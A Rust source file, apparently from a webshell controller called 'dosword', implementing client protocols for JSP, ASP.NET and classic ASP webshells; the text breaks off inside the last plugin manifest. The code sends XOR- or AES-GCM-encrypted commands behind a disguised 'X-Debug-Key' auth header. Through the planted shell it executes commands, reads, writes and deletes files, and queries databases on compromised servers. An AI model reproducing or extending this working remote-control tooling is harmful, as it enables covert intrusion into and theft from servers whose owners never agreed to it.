//! JSP / ASP.NET 协议：与 PHP native 相同的载荷协议
//! （formData XOR 密文 + X-Debug-Key 头鉴权 + md5 哈希分发）。
//! 当前仅支持 XOR 载荷（stub 无第三方加密依赖）。

use std::sync::{Arc, Mutex};

use base64::Engine;
use url::Url;

use dosword_sdk::aead::AeadSession;
use dosword_sdk::domain::{
    AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing,
    ProbeResult, ShellProfile, TargetCapabilities,
};
use dosword_sdk::encoder::{AeadEncoder, NATIVE_XOR, PayloadEncoder, md5_hex};

use super::transport::{form_escape, json_str};
use dosword_sdk::{Protocol, ProtocolError, SessionState};

/// JSP 会话状态。
pub struct JspSession {
    /// 所属协议 id（builtin.jsp.v1 / builtin.aspnet.v1 / ...，请求日志标记用）。
    pub protocol_id: String,
    pub endpoint: String,
    pub password: String,
    pub client: reqwest::blocking::Client,
    /// 载荷编码器（native = XOR；native_aead = HKDF + AES-256-GCM）。
    pub encoder: &'static dyn PayloadEncoder,
    /// AEAD 会话状态（仅 native_aead）：发送序号 + 接收滑动窗口。
    pub aead: Option<Mutex<AeadSession>>,
    /// 上次探测的环境信息（current_dir / separator）。
    pub info: Mutex<Option<ProbeResult>>,
    /// 会话当前工作目录（cd 支持）。
    pub cwd: Mutex<String>,
}

impl SessionState for JspSession {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
}

fn build_client(settings: &AppSettings) -> reqwest::blocking::Client {
    crate::protocol::transport::build_client(settings)
}

/// 从 `protocol_params` 选择编码器（缺省 native = XOR；仅支持 native / native_aead）。
fn encoder_for(protocol_params: &str) -> Result<&'static dyn PayloadEncoder, ProtocolError> {
    let id = serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| {
            value
                .get("encoder")
                .and_then(|item| item.as_str().map(str::to_string))
        })
        .unwrap_or_else(|| "native".to_string());
    match id.as_str() {
        "native" => Ok(&NATIVE_XOR),
        "native_aead" => Ok(&AeadEncoder),
        other => Err(ProtocolError::NotSupported(format!(
            "JSP/ASPX/ASP/Python/Node 协议仅支持 native / native_aead 编码器（当前 {other}）"
        ))),
    }
}

/// 构造会话（编码器由 protocol_params 决定）。
fn make_session(
    protocol_id: &str,
    endpoint: &str,
    password: &str,
    protocol_params: &str,
    settings: &AppSettings,
) -> Result<JspSession, ProtocolError> {
    let encoder = encoder_for(protocol_params)?;
    // 经典 ASP（VBScript）没有内置 AES-GCM，无法生成对应的 AEAD stub：
    // 在这里就明确拒绝，避免连上之后每条请求都失败（错误信息与生成端一致）
    if protocol_id == "builtin.asp.v1" && encoder.id() == "native_aead" {
        return Err(ProtocolError::NotSupported(
            "经典 ASP（VBScript）没有内置 AES-GCM，AEAD 不可用；请改用 native（XOR）或 JSP / ASPX / Python / Node"
                .to_string(),
        ));
    }
    let aead = (encoder.id() == "native_aead").then(|| Mutex::new(AeadSession::new(password)));
    Ok(JspSession {
        protocol_id: protocol_id.to_string(),
        endpoint: endpoint.to_string(),
        password: password.to_string(),
        client: build_client(settings),
        encoder,
        aead,
        info: Mutex::new(None),
        cwd: Mutex::new(String::new()),
    })
}

/// 统一编码入口：AEAD 走带序号的会话状态，其余走编码器本身。
fn encode_payload(session: &JspSession, plaintext: &str) -> Result<String, ProtocolError> {
    match &session.aead {
        Some(aead) => aead
            .lock()
            .map_err(|_| ProtocolError::ParseError("AEAD 状态锁异常".into()))?
            .seal(plaintext.as_bytes())
            .map_err(ProtocolError::ParseError),
        None => Ok(session.encoder.encode(plaintext, &session.password)),
    }
}

/// 统一解码入口（响应方向；AEAD 会校验 tag 与序号窗口）。
fn decode_payload(session: &JspSession, payload: &str) -> Result<Vec<u8>, ProtocolError> {
    match &session.aead {
        Some(aead) => aead
            .lock()
            .map_err(|_| ProtocolError::ParseError("AEAD 状态锁异常".into()))?
            .open(payload)
            .map_err(ProtocolError::ParseError),
        None => session.encoder.decode(payload, &session.password),
    }
}

fn conn_json(connection: &DbConnection) -> String {
    serde_json::to_string(connection).unwrap_or_else(|_| "{}".to_string())
}

/// 发送一次载荷请求：formData（XOR 密文）+ X-Debug-Key 头 → {data, code} 响应。
fn form_call(
    session: &JspSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<serde_json::Value, ProtocolError> {
    let mut request = format!("{{\"a\":\"{action}\"");
    for (key, value) in params {
        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
    }
    // S12：内嵌鉴权令牌（stub 优先从请求体校验，兼容不传递自定义 HTTP 头的环境）
    let token = &md5_hex(&session.password)[..16];
    request.push_str(&format!(",\"token\":\"{token}\""));
    request.push('}');
    let payload = encode_payload(session, &request)?;
    // 快速表单转义（与 php.rs 的 P2 一致）：base64 仅需转义 +、=、&
    let body = format!("formData={}", form_escape(&payload));
    let token = &md5_hex(&session.password)[..16];
    let start = std::time::Instant::now();
    let response = session
        .client
        .post(&session.endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("X-Debug-Key", token)
        .body(body)
        .send()
        .map_err(|error| ProtocolError::Network(error.to_string()))?;
    let status = response.status();
    let duration_ms = start.elapsed().as_millis() as u64;
    if !status.is_success() {
        crate::protocol::reqlog::record_request(
            &session.protocol_id,
            action,
            &session.endpoint,
            status.as_u16(),
            duration_ms,
            &request,
            "",
            &session.password,
        );
        return Err(ProtocolError::HttpStatus(
            status.as_u16(),
            status.canonical_reason().unwrap_or("").to_string(),
        ));
    }
    // 与 PHP 协议一致：响应体受 max_file_size_mb 上限约束（流式限长，防恶意目标撑爆内存）
    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
    let bytes = crate::protocol::transport::read_limited(response, max_bytes)
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    if bytes.len() > max_bytes as usize {
        return Err(ProtocolError::ParseError(format!(
            "响应超过大小上限（{}MB）",
            settings.max_file_size_mb
        )));
    }
    let text = String::from_utf8_lossy(&bytes);
    // 请求调试记录（A1：JSP/ASP/Python/Node 协议帧统一进调试页，密码脱敏）
    crate::protocol::reqlog::record_request(
        &session.protocol_id,
        action,
        &session.endpoint,
        status.as_u16(),
        duration_ms,
        &request,
        &text,
        &session.password,
    );
    let outer: serde_json::Value = serde_json::from_str(&text)
        .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".to_string()))?;
    let data = outer
        .get("data")
        .and_then(|v| v.as_str())
        .ok_or_else(|| ProtocolError::ParseError("响应缺少 data 字段".to_string()))?;
    let data = crate::protocol::transport::gunzip_if_needed(data);
    let plain = decode_payload(session, &data)?;
    let value: serde_json::Value = serde_json::from_slice(&plain)
        .map_err(|_| ProtocolError::ParseError("响应内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// 缓存环境信息（current_dir / separator），供文件操作。
/// 兼容两类 stub 的分块读取语义：
/// - 支持 seek 的 stub 已按 `o`/`l` 返回分块（长度 ≤ length）→ 原样使用；
/// - 不支持 seek 的 stub 忽略参数、返回整文件（长度 > length）→ 按 offset 切片。
///
/// 旧实现无条件二次切片，导致 offset > 0 时 `offset >= total` 直接读空。
fn slice_chunk(bytes: Vec<u8>, offset: u64, length: u64) -> Vec<u8> {
    let total = bytes.len() as u64;
    if total <= length {
        return bytes;
    }
    if offset >= total {
        return Vec::new();
    }
    let end = (offset + length).min(total);
    bytes[offset as usize..end as usize].to_vec()
}

fn ensure_info(session: &JspSession, settings: &AppSettings) -> Result<ProbeResult, ProtocolError> {
    if let Ok(guard) = session.info.lock()
        && let Some(info) = guard.as_ref()
        && !info.current_dir.is_empty()
    {
        return Ok(info.clone());
    }
    let value = form_call(session, "probe", &[], settings)?;
    // stub 上报的 info（能力协商）：键值均为字符串
    let mut info_map = std::collections::HashMap::new();
    if let Some(object) = value.pointer("/data/info").and_then(|v| v.as_object()) {
        for (key, item) in object {
            let text = item
                .as_str()
                .map(str::to_string)
                .unwrap_or_else(|| item.to_string());
            info_map.insert(key.clone(), text);
        }
    }
    let capabilities = TargetCapabilities::from_info(&info_map);
    let info = ProbeResult {
        status: "online".to_string(),
        server: value
            .pointer("/data/server")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        web_server: value
            .pointer("/data/web_server")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        runtime: value
            .pointer("/data/php_version")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        current_dir: value
            .pointer("/data/current_dir")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        separator: value
            .pointer("/data/separator")
            .and_then(|v| v.as_str())
            .unwrap_or("/")
            .to_string(),
        message: "JSP/ASP 协议探测成功".to_string(),
        php_sapi: "".to_string(),
        arch: "".to_string(),
        extensions: vec![],
        disable_functions: "".to_string(),
        capabilities,
        info: info_map,
    };
    if let Ok(mut slot) = session.info.lock() {
        *slot = Some(info.clone());
    }
    Ok(info)
}

/// JSP 与 ASP.NET 协议共用的协议实现（id 不同）。
struct JvmLikeProtocol {
    id: &'static str,
    display_name: &'static str,
}

impl Protocol for JvmLikeProtocol {
    fn id(&self) -> &'static str {
        self.id
    }

    fn display_name(&self) -> &'static str {
        self.display_name
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        let session = make_session(
            self.id,
            &profile.endpoint,
            &profile.password,
            &profile.protocol_params,
            settings,
        )?;
        ensure_info(&session, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        let session = make_session(
            self.id,
            &profile.endpoint,
            &profile.password,
            &profile.protocol_params,
            settings,
        )?;
        let info = ensure_info(&session, settings)?;
        if let Ok(mut cwd) = session.cwd.lock() {
            *cwd = info.current_dir.clone();
        }
        Ok((Box::new(session), info))
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let w = jsp.cwd.lock().map(|c| c.clone()).unwrap_or_default();
        let value = form_call(jsp, "exec", &[("c", command), ("w", &w)], settings)?;
        let stdout = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(stdout)
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        if !cwd.is_empty()
            && let Ok(mut slot) = jsp.cwd.lock()
        {
            *slot = cwd.clone();
        }
        Ok(CommandOutput {
            stdout: String::from_utf8_lossy(&decoded).into_owned(),
            cwd: Some(cwd),
            duration_ms: 0,
            raw_b64: Some(base64::engine::general_purpose::STANDARD.encode(&decoded)),
        })
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let info = ensure_info(jsp, settings)?;
        let value = form_call(jsp, "list", &[("p", path)], settings)?;
        let mut entries = Vec::new();
        if let Some(items) = value.pointer("/data/entries").and_then(|v| v.as_array()) {
            for item in items {
                entries.push(dosword_sdk::domain::FileEntry {
                    name: item
                        .get("name")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    path: item
                        .get("path")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    is_dir: item
                        .get("is_dir")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false),
                    size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                    modified: item
                        .get("mtime")
                        .and_then(|v| v.as_i64())
                        .map(|ts| ts.to_string())
                        .unwrap_or_default(),
                    perms: "".to_string(),
                });
            }
        }
        let _ = &info;
        Ok(DirListing { entries })
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let value = form_call(jsp, "read", &[("p", path)], settings)?;
        let data = value
            .pointer("/data")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        base64::engine::general_purpose::STANDARD
            .decode(data)
            .map_err(|_| ProtocolError::ParseError("文件内容 Base64 解码失败".to_string()))
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let data = base64::engine::general_purpose::STANDARD.encode(content);
        form_call(jsp, "write", &[("p", path), ("d", &data)], settings)?;
        Ok(())
    }

    /// P1：分块读取（stub 支持 seek 时按 offset 定位；否则返回整文件由本端切片）。
    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let value = form_call(
            jsp,
            "read",
            &[
                ("p", path),
                ("o", &offset.to_string()),
                ("l", &length.to_string()),
            ],
            settings,
        )?;
        let data = value
            .pointer("/data")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(data)
            .map_err(|_| ProtocolError::ParseError("文件内容 Base64 解码失败".to_string()))?;
        // 双重切片 bug：stub 支持偏移读写（chunked 能力）时服务端已按 o/l 返回切片，
        // 本端再从 offset 切一次 → offset>0 的第二次读取必然拿到空块。
        // 只有旧 stub（无 chunked 能力、忽略 o/l 返回整文件）才需要本端切片。
        let stub_seeks = ensure_info(jsp, settings)
            .ok()
            .and_then(|info| info.capabilities)
            .map(|caps| caps.supports_chunked())
            .unwrap_or(false);
        if stub_seeks {
            Ok(bytes)
        } else {
            Ok(slice_chunk(bytes, offset, length))
        }
    }

    /// P1：分块写入（stub 支持 seek 时按 offset 定位覆盖写；否则整文件读改写）。
    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let b64 = base64::engine::general_purpose::STANDARD.encode(content);
        form_call(
            jsp,
            "write",
            &[("p", path), ("d", &b64), ("o", &offset.to_string())],
            settings,
        )?;
        Ok(())
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let value = form_call(jsp, "dbprobe", &[("c", &conn_json(connection))], settings)?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver: connection.driver.clone(),
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let value = form_call(
            jsp,
            "dbquery",
            &[("c", &conn_json(connection)), ("q", sql)],
            settings,
        )?;
        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|row| {
                        row.as_array().map(|cells| {
                            cells
                                .iter()
                                .map(|cell| {
                                    cell.as_str().map(str::to_string).or_else(|| {
                                        if cell.is_null() {
                                            Some("NULL".to_string())
                                        } else {
                                            None
                                        }
                                    })
                                })
                                .collect::<Vec<Option<String>>>()
                        })
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms: 0,
        })
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        form_call(jsp, "delete", &[("p", path)], settings)?;
        Ok(())
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        form_call(jsp, "rename", &[("f", from), ("t", to)], settings)?;
        Ok(())
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        form_call(jsp, "mkdir", &[("p", path)], settings)?;
        Ok(())
    }
}

/// JSP 协议（builtin.jsp.v1）。
pub struct JspProtocol;

impl Protocol for JspProtocol {
    fn id(&self) -> &'static str {
        "builtin.jsp.v1"
    }

    fn display_name(&self) -> &'static str {
        "JSP（Java，XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .create_dir(session, path, settings)
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .read_chunk(session, path, offset, length, settings)
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .write_chunk(session, path, content, offset, settings)
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .db_probe(session, connection, settings)
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.jsp.v1",
            display_name: "",
        }
        .db_query(session, connection, sql, settings)
    }
}

/// ASP.NET 协议（builtin.aspnet.v1）。
pub struct AspNetProtocol;

impl Protocol for AspNetProtocol {
    fn id(&self) -> &'static str {
        "builtin.aspnet.v1"
    }

    fn display_name(&self) -> &'static str {
        "ASP.NET（C#，XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .create_dir(session, path, settings)
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .read_chunk(session, path, offset, length, settings)
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.aspnet.v1",
            display_name: "",
        }
        .write_chunk(session, path, content, offset, settings)
    }
}

/// 经典 ASP 协议（builtin.asp.v1，VBScript stub，XOR 载荷）。
pub struct AspProtocol;

impl Protocol for AspProtocol {
    fn id(&self) -> &'static str {
        "builtin.asp.v1"
    }

    fn display_name(&self) -> &'static str {
        "ASP（VBScript，XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .create_dir(session, path, settings)
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .read_chunk(session, path, offset, length, settings)
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.asp.v1",
            display_name: "",
        }
        .write_chunk(session, path, content, offset, settings)
    }
}

impl dosword_sdk::ProtocolPlugin for AspProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "经典 ASP WebShell（VBScript）：命令执行、文件管理（XOR 载荷）。"
                .to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

/// 环境信息缓存（供 connect 后的文件操作取 cwd/separator）。
/// 供命令层使用的辅助：构造临时会话。
pub fn _temp_session(
    endpoint: &str,
    password: &str,
    protocol_params: &str,
    settings: &AppSettings,
) -> Result<JspSession, ProtocolError> {
    make_session(
        "builtin.jsp.v1",
        endpoint,
        password,
        protocol_params,
        settings,
    )
}

/// 供命令层使用的辅助：会话里的端信息。
pub fn _endpoint(session: &JspSession) -> &str {
    &session.endpoint
}

pub fn _capabilities() -> Vec<String> {
    vec!["files".into(), "terminal".into()]
}

// 抑制未使用告警（Arc/Url 保留给后续扩展）
#[allow(dead_code)]
fn _keep(_: &Arc<()>, _: &Url) {}

impl dosword_sdk::ProtocolPlugin for JspProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
